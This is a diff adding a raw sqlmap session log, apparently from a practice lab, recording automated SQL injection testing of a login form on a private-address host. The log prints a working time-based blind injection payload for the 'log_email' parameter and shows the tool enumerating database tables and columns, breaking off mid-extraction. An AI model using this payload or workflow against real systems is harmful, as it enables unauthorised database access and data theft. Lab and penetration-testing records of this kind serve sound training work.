@@ -1,0 +1,159 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 10:59:06 /2020-11-24/
+
+do you want to check for the existence of site's sitemap(.xml) [y/N] [10:59:10] [WARNING] 'sitemap.xml' not found
+[10:59:10] [INFO] starting crawler for target URL 'http://10.10.128.64/register.php'
+[10:59:10] [INFO] searching for links with depth 1
+got a 302 redirect to 'http://10.10.128.64/register.php'. Do you want to follow? [Y/n] [10:59:15] [INFO] searching for links with depth 2
+please enter number of threads? [Enter for 1 (current)] [10:59:21] [INFO] starting 10 threads
+do you want to normalize crawling results [Y/n] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] [10:59:44] [INFO] found a total of 2 targets
+[#1] form:
+POST http://10.10.128.64/register.php
+POST data: log_email=&log_password=&login_button=Login
+do you want to test this form? [Y/n/q] 
+> Edit POST data [default: log_email=&log_password=&login_button=Login] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] [10:59:53] [INFO] using '/home/starling/.local/share/sqlmap/output/results-11242020_1059am.csv' as the CSV results file in multiple targets mode
+[10:59:54] [WARNING] the web server responded with an HTTP error code (404) which could interfere with the results of the tests
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=okjrju8br58...s29u0tqc09'). Do you want to use those [Y/n] [10:59:57] [INFO] testing if the target URL content is stable
+[10:59:58] [INFO] target URL content is stable
+[10:59:58] [INFO] testing if POST parameter 'log_email' is dynamic
+[10:59:59] [WARNING] POST parameter 'log_email' does not appear to be dynamic
+[11:00:00] [WARNING] heuristic (basic) test shows that POST parameter 'log_email' might not be injectable
+[11:00:02] [INFO] heuristic (XSS) test shows that POST parameter 'log_email' might be vulnerable to cross-site scripting (XSS) attacks
+[11:00:02] [INFO] testing for SQL injection on POST parameter 'log_email'
+[11:00:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:00:03] [WARNING] reflective value(s) found and filtering out
+[11:00:12] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:00:13] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:00:17] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:00:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[11:00:25] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:00:29] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[11:00:29] [INFO] testing 'Generic inline queries'
+[11:00:30] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:00:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:00:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:00:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:00:52] [INFO] POST parameter 'log_email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [11:01:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:01:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[11:01:56] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[11:01:56] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
+got a 302 redirect to 'http://10.10.128.64:80/index.php'. Do you want to follow? [Y/n] redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] [11:02:21] [INFO] target URL appears to be UNION injectable with 12 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] [11:03:41] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[11:03:41] [INFO] checking if the injection point on POST parameter 'log_email' is a false positive
+POST parameter 'log_email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] [11:04:58] [WARNING] POST parameter 'log_password' does not appear to be dynamic
+[11:04:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[11:04:59] [WARNING] heuristic (basic) test shows that POST parameter 'log_password' might not be injectable
+[11:05:00] [INFO] testing for SQL injection on POST parameter 'log_password'
+[11:05:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:05:04] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:05:05] [INFO] testing 'Generic inline queries'
+[11:05:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:05:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[11:05:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:05:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:05:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[11:05:22] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:05:27] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:05:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:05:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:05:36] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[11:05:39] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[11:05:44] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] [11:07:30] [INFO] testing 'Generic UNION query (89) - 1 to 10 columns'
+[11:07:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[11:07:38] [WARNING] POST parameter 'log_password' does not seem to be injectable
+[11:07:38] [WARNING] POST parameter 'login_button' does not appear to be dynamic
+[11:07:38] [WARNING] heuristic (basic) test shows that POST parameter 'login_button' might not be injectable
+[11:07:39] [INFO] testing for SQL injection on POST parameter 'login_button'
+[11:07:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:07:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[11:07:44] [INFO] testing 'Generic inline queries'
+[11:07:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[11:07:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[11:07:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[11:07:52] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:07:56] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[11:07:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:08:03] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:08:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:08:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:08:13] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[11:08:17] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[11:08:21] [INFO] testing 'Oracle AND time-based blind'
+[11:08:26] [INFO] testing 'Generic UNION query (89) - 1 to 10 columns'
+[11:08:33] [WARNING] POST parameter 'login_button' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 319 HTTP(s) requests:
+---
+Parameter: log_email (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: log_email=mqqV' AND (SELECT 6316 FROM (SELECT(SLEEP(5)))Bndb) AND 'AtRr'='AtRr&log_password=&login_button=Login
+---
+do you want to exploit this SQL injection? [Y/n] [11:14:14] [INFO] the back-end DBMS is MySQL
+[11:14:14] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[11:14:14] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+back-end DBMS: MySQL >= 5.0.12
+[11:14:19] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[11:14:19] [INFO] fetching current database
+
+[11:14:19] [INFO] retrieved: do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] [11:14:41] [INFO] adjusting time delay to 3 seconds due to good response times
+social
+[11:15:56] [INFO] fetching tables for database: 'social'
+[11:15:56] [INFO] fetching number of tables for database 'social'
+
+[11:15:56] [INFO] retrieved: 8
+
+[11:16:10] [INFO] retrieved: comments
+
+[11:18:15] [INFO] retrieved: friend_requests
+
+[11:22:02] [INFO] retrieved: likes
+
+[11:23:17] [INFO] retrieved: [11:23:40] [ERROR] invalid character detected. retrying..
+[11:23:40] [WARNING] increasing time delay to 4 seconds
+messages
+
+[11:25:49] [INFO] retrieved: notifications
+
+[11:29:45] [INFO] retrieved: posts
+[11:31:46] [ERROR] invalid character detected. retrying..
+[11:31:46] [WARNING] increasing time delay to 5 seconds
+
+
+[11:31:48] [INFO] retrieved: trends
+
+[11:34:12] [INFO] retrieved: users
+[11:36:01] [INFO] fetching columns for table 'posts' in database 'social'
+
+[11:36:01] [INFO] retrieved: 9
+
+[11:36:23] [INFO] retrieved: id
+
+[11:37:08] [INFO] retrieved: body
+
+[11:38:42] [INFO] retrieved: added_by
+
+[11:41:35] [INFO] retrieved: user_to
+
+[11:44:40] [INFO] retrieved: date_
+[11:47:00] [ERROR] invalid character detected. retrying..
+[11:47:00] [WARNING] increasing time delay to 6 seconds
+added
+
+[11:48:51] [INFO] retrieved: user_closed
+
+[11:53:42] [INFO] retrieved: [11:54:07] [ERROR] invalid character detected. retrying..
+[11:54:07] [WARNING] increasing time delay to 7 seconds
+d
+[11:55:03] [ERROR] invalid character detected. retrying..
+[11:55:03] [WARNING] increasing time delay to 8 seconds
